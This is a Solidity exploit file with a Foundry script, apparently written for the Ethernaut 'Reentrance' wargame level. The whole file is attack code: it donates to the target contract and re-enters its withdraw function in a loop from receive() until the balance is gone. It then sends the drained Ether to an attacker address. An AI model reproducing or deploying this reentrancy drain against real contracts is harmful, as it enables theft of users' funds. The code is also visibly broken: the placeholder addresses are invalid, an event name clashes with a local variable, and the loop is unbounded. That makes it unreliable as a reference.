// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";

// Helper contract to exploit the Reentrance contract vulnerability
contract ReentranceExploit {
    // Address of the vulnerable Reentrance contract
    address payable reentranceContractAddress = payable(0xYourInstanceAddressHere);  // Replace with actual instance address
    // Address of the attacker (your own address)
    address payable attackerAddress = payable(0xYourAttackerAddressHere);  // Replace with actual attacker address
    // Amount of Ether to be sent (in wei)
    uint256 attackAmount = 1000000000000000;  // 0.001 ETH
    // Payloads to call the Reentrance contract's functions
    bytes payloadWithdraw = abi.encodeWithSignature("withdraw(uint256)", attackAmount);
    bytes payloadDonate = abi.encodeWithSignature("donate(address)", address(this));

    // Function to donate Ether to the Reentrance contract
    function donateToContract() public {
        // Perform a low-level call to the donate function with the specified amount
        (bool success,) = reentranceContractAddress.call{value: attackAmount}(payloadDonate);
        require(success, "Donate call failed");
    }

    // Function to call the withdraw function and initiate reentrancy
    function withdrawFromContract() public {
        // Call the withdraw function via a low-level call
        (bool success,) = reentranceContractAddress.call(payloadWithdraw);
        require(success, "Withdraw call failed");
    }

    // Function to deposit Ether into this contract
    function depositToExploit() public payable returns (bool) {
        return true;  // Simply accept deposits
    }

    // Function to withdraw all funds from this contract to the attacker's address
    function withdrawToAttacker() public {
        // Transfer all the contract's balance to the attacker address
        (bool success,) = attackerAddress.call{value: address(this).balance}("");
        require(success, "Transfer to attacker failed");
    }

    // Fallback function triggered during reentrancy
    receive() external payable {
        // Keep reentering the Reentrance contract as long as it has balance
        while (reentranceContractAddress.balance > 0) {
            (bool success,) = reentranceContractAddress.call(payloadWithdraw);
            emit success(success);  // Emit an event to track the success of each call
        }
    }

    // Event to log the result of each reentrancy call
    event success(bool);
}

// Forge script to deploy and run the exploit
contract ReentranceExploitDeployer is Script {

    uint256 attackAmount = 1000000000000000;  // 0.001 ETH

    // Main function to deploy the exploit and run it
    function run() external {
        // Start broadcasting the transaction using the private key
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the ReentranceExploit contract
        ReentranceExploit exploitInstance = new ReentranceExploit();
        
        // Deposit Ether into the attacker contract
        exploitInstance.depositToExploit{value: attackAmount}();
        
        // Donate Ether to the vulnerable Reentrance contract
        exploitInstance.donateToContract();

        // Trigger the reentrancy exploit by calling withdraw
        exploitInstance.withdrawFromContract();

        // Withdraw the drained Ether to the attacker's address
        exploitInstance.withdrawToAttacker();

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}